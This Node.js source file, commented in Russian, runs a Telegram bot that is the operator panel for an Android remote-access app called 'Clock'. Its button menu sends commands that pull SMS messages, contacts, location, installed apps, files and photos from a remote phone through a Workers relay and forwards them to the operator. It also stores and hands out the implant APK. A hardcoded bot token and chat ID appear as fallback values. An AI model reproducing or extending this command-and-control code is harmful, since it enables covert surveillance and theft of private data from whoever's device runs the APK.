// index.js — Telegram-бот для Bothost (Node.js)
// читает переменные окружения: BOT_TOKEN, CHAT_ID, WORKER

const BOT_TOKEN = process.env.BOT_TOKEN || "8652881714:AAF26AXm_NrSZthFEToHBWB0qTOmqYS8S6E";
const CHAT_ID = process.env.CHAT_ID || "6138397255";
const WORKER = process.env.WORKER || "https://gentle-dream-9590.pechenka242009.workers.dev";
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;

let lastUpdateId = 0;
let apkFileId = null;
let apkFileName = null;
const logs = [];
let clockLastSeen = 0;
let clockModel = "неизвестно";

// ===== HTTP =====
async function tg(method, body) {
    try {
        const res = await fetch(`${API}/${method}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body),
        });
        return await res.json();
    } catch (e) {
        console.error("tg error:", e.message);
        return { ok: false };
    }
}

async function workerGet(path) {
    try {
        const res = await fetch(`${WORKER}${path}`);
        return await res.json();
    } catch (e) {
        return { ok: false };
    }
}

async function workerPost(path, body) {
    try {
        const res = await fetch(`${WORKER}${path}`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams(body).toString(),
        });
        return await res.json();
    } catch (e) {
        return { ok: false };
    }
}

// ===== ОТПРАВКА =====
async function sendMessage(text, keyboard) {
    const body = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
    };
    if (keyboard) body.reply_markup = keyboard;
    return tg("sendMessage", body);
}

async function sendDocument(fileId, fileName) {
    return tg("sendDocument", {
        chat_id: CHAT_ID,
        document: fileId,
        caption: fileName || "APK",
    });
}

// ===== МЕНЮ =====
const mainKeyboard = {
    keyboard: [
        [{ text: "🔔 Ping" }, { text: "🔋 Батарея" }],
        [{ text: "📱 SMS" }, { text: "👥 Контакты" }],
        [{ text: "📍 Локация" }, { text: "📦 Приложения" }],
        [{ text: "📁 Файлы" }, { text: "📷 Фото" }],
        [{ text: "📤 Отправить APK" }, { text: "📥 Загрузить APK" }],
        [{ text: "📊 Логи" }, { text: "ℹ️ Статус" }],
    ],
    resize_keyboard: true,
};

// ===== ОБРАБОТКА СООБЩЕНИЙ =====
async function handleMessage(msg) {
    const chatId = String(msg.chat.id);
    const text = msg.text || "";
    const fromChat = chatId === String(CHAT_ID);

    if (!fromChat) {
        await sendMessage("⛔ Доступ запрещён.");
        return;
    }

    // приём APK
    if (msg.document) {
        if (msg.document.mime_type === "application/vnd.android.package-archive" ||
            (msg.document.file_name || "").endsWith(".apk")) {
            apkFileId = msg.document.file_id;
            apkFileName = msg.document.file_name || "clock.apk";
            logs.push(`[${new Date().toISOString()}] APK обновлён: ${apkFileName}`);
            await sendMessage(
                `✅ APK сохранён:\n<b>${apkFileName}</b>\nРазмер: ${Math.round(msg.document.file_size / 1024)} КБ`
            );
            return;
        }
    }

    switch (text) {
        case "/start":
            await sendMessage(
                "👋 <b>Clock Bot</b>\n\n" +
                "Управление удалённым устройством через кнопки.\n\n" +
                "📤 <b>Отправить APK</b> — бот выдаст текущий APK\n" +
                "📥 <b>Загрузить APK</b> — пришлите новый APK файлом\n" +
                "📊 <b>Логи</b> — последние события\n" +
                "ℹ️ <b>Статус</b> — состояние устройства",
                mainKeyboard
            );
            break;

        case "🔔 Ping":
            await sendCommand("/ping");
            break;

        case "🔋 Батарея":
            await sendCommand("/battery");
            break;

        case "📱 SMS":
            await sendCommand("/sms");
            break;

        case "👥 Контакты":
            await sendCommand("/contacts");
            break;

        case "📍 Локация":
            await sendCommand("/location");
            break;

        case "📦 Приложения":
            await sendCommand("/apps");
            break;

        case "📁 Файлы":
            await sendCommand("/files");
            break;

        case "📷 Фото":
            await sendCommand("/photos");
            break;

        case "📤 Отправить APK":
            if (apkFileId) {
                await sendDocument(apkFileId, apkFileName);
            } else {
                await sendMessage("❌ APK ещё не загружен. Нажмите <b>📥 Загрузить APK</b> и пришлите файл.");
            }
            break;

        case "📥 Загрузить APK":
            await sendMessage(
                "📥 Пришлите APK файлом. Бот сохранит и будет отдавать по кнопке <b>📤 Отправить APK</b>.",
                mainKeyboard
            );
            break;

        case "📊 Логи":
            const last = logs.slice(-50).join("\n") || "— пусто —";
            await sendMessage(`<b>Последние 50 событий:</b>\n\n${last}`);
            break;

        case "ℹ️ Статус":
            const ago = clockLastSeen ? Math.round((Date.now() - clockLastSeen) / 1000) : null;
            const status =
                ago === null
                    ? "❓ Никогда не отвечал"
                    : ago < 300
                    ? `✅ Активно (${ago} сек назад)`
                    : `⚠️ Молчит ${Math.round(ago / 60)} мин`;
            await sendMessage(
                `<b>Статус Clock:</b>\n` +
                `• Модель: ${clockModel}\n` +
                `• Связь: ${status}\n` +
                `• APK: ${apkFileId ? apkFileName : "не загружен"}\n` +
                `• Логи: ${logs.length} записей`
            );
            break;

        default:
            await sendMessage("🤷 Неизвестная команда. Нажмите /start", mainKeyboard);
    }
}

// ===== ОТПРАВКА КОМАНДЫ В ОЧЕРЕДЬ =====
async function sendCommand(cmd) {
    const result = await workerPost(
        `/bot${BOT_TOKEN}/sendMessage`,
        { chat_id: CHAT_ID, text: cmd }
    );
    if (result && result.ok) {
        logs.push(`[${new Date().toISOString()}] → ${cmd}`);
        await sendMessage(`📤 Команда <code>${cmd}</code> отправлена. Ответ придёт отдельным сообщением.`);
    } else {
        await sendMessage(`❌ Не удалось отправить команду. Worker ответил: ${JSON.stringify(result).slice(0, 200)}`);
    }
}

// ===== ЧТЕНИЕ ОТВЕТОВ ОТ CLOCK =====
async function pollClockReplies() {
    try {
        const result = await workerGet(`/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
        if (!result || !result.ok || !result.result) return;

        for (const update of result.result) {
            lastUpdateId = update.update_id;
            const msg = update.message;
            if (!msg) continue;

            if (String(msg.chat.id) !== String(CHAT_ID)) continue;

            // текст от Clock
            if (msg.text) {
                clockLastSeen = Date.now();
                const m = msg.text.match(/Clock started on (.+)/);
                if (m) clockModel = m[1];

                logs.push(`[${new Date().toISOString()}] ← ${msg.text.slice(0, 100)}`);

                // ответ от Clock — пересылаем как есть
                if (msg.text.startsWith("pong from ")) {
                    clockModel = msg.text.replace("pong from ", "");
                }
            }

            // фото от Clock
            if (msg.photo && msg.photo.length) {
                clockLastSeen = Date.now();
                const largest = msg.photo[msg.photo.length - 1];
                await sendDocumentToYou(largest.file_id, msg.caption || "photo");
                logs.push(`[${new Date().toISOString()}] ← фото`);
            }

            // документ от Clock
            if (msg.document) {
                clockLastSeen = Date.now();
                await sendDocumentToYou(msg.document.file_id, msg.document.file_name || "file");
                logs.push(`[${new Date().toISOString()}] ← документ ${msg.document.file_name}`);
            }
        }
    } catch (e) {
        console.error("poll error:", e.message);
    }
}

// переслать файл тебе
async function sendDocumentToYou(fileId, name) {
    return tg("sendDocument", {
        chat_id: CHAT_ID,
        document: fileId,
        caption: name,
    });
}

// ===== ГЛАВНЫЙ ЦИКЛ =====
async function loop() {
    while (true) {
        try {
            const result = await workerGet(`/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            if (result && result.ok && result.result) {
                for (const update of result.result) {
                    lastUpdateId = update.update_id;
                    if (update.message) await handleMessage(update.message);
                }
            }
        } catch (e) {
            console.error("main loop error:", e.message);
        }
        await new Promise((r) => setTimeout(r, 1000));
    }
}

// ===== СТАРТ =====
console.log("🤖 Clock Bot стартует...");
console.log("BOT_TOKEN:", BOT_TOKEN.slice(0, 15) + "...");
console.log("WORKER:", WORKER);

sendMessage(
    "🚀 <b>Clock Bot запущен</b>\n\n" +
    "Управление через кнопки ниже. Нажмите /start для меню.",
    mainKeyboard
).then(() => {
    loop();
});
